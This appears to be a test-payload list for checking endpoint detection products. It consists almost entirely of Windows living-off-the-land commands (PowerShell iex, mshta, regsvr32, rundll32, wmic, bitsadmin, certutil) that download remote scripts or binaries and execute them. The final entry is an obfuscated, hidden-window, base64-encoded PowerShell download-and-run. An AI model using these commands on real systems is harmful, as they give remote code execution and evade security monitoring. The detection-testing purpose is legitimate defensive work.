# EdrTestPayloads

Powershell loading base64		powershell -noprofile -enc "JgAoACIAYwBhAGwAIgArACIAYwAuAGUAeAAiACsAIgBlACIAKQA="
Powershell loading from internet		powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;Invoke-WebRequest('https://raw.githubusercontent.com/jbfuzier/EdrTestPayloads/master/calc.ps1')|iex"
		powershell -exec bypass -c "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/jbfuzier/EdrTestPayloads/master/calc.ps1')|iex"
		powershell -exec bypass -c "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/jbfuzier/EdrTestPayloads/master/calc.ps1', '%TEMP%/calc.ps1')"
		powershell -exec bypass -c "Start-BitsTransfer -Source 'https://raw.githubusercontent.com/jbfuzier/EdrTestPayloads/master/calc.ps1', 'calc.ps1' -Destination  'calc.ps1'"
MsHta https		mshta vbscript:Close(Execute("GetObject(""script:https://raw.githubusercontent.com/jbfuzier/EdrTestPayloads/master/calc.sct"")"))
		
		mshta "about:<script>var myMsgBox=new ActiveXObject('wscript.shell');myMsgBox.Popup ('Hello')</script>"
		mshta.exe vbscript:GetObject("script:https://raw.githubusercontent.com/jbfuzier/EdrTestPayloads/master/calc.hta")(window.close)
T1197 - BITS Jobs		
		bitsadmin.exe  /transfer /Download /priority normal https://raw.githubusercontent.com/jbfuzier/EdrTestPayloads/master/calc.bat %TEMP%/calc.bat
T1223 - Compiled HTML File		hh.exe https://raw.githubusercontent.com/jbfuzier/EdrTestPayloads/master/calc.chm
T1170 - Mshta		mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/jbfuzier/EdrTestPayloads/master/calc.sct')).Exec();close();
T1117 - Regsvr32		regsvr32.exe /s /u /i:https://raw.githubusercontent.com/jbfuzier/EdrTestPayloads/master/calc.sct scrobj.dll
		rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/jbfuzier/EdrTestPayloads/master/calc.sct").Exec();"
		wmic os get /format:"https://raw.githubusercontent.com/jbfuzier/EdrTestPayloads/master/calc.xsl"
		certutil -urlcache -split -f https://raw.githubusercontent.com/jbfuzier/EdrTestPayloads/master/putty.exe.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
		"powershell.exe -e^x^e^c b^y^p^a^s^s -w^i^n^d^o^w h^i^d^d^e^n -n^o^n^i -n^o^p -e^n^c^o^d^e^d 
SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMgAzADEALgAyADIANQAuADUAMQAvAGUAeABlAGM
AUABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA= "
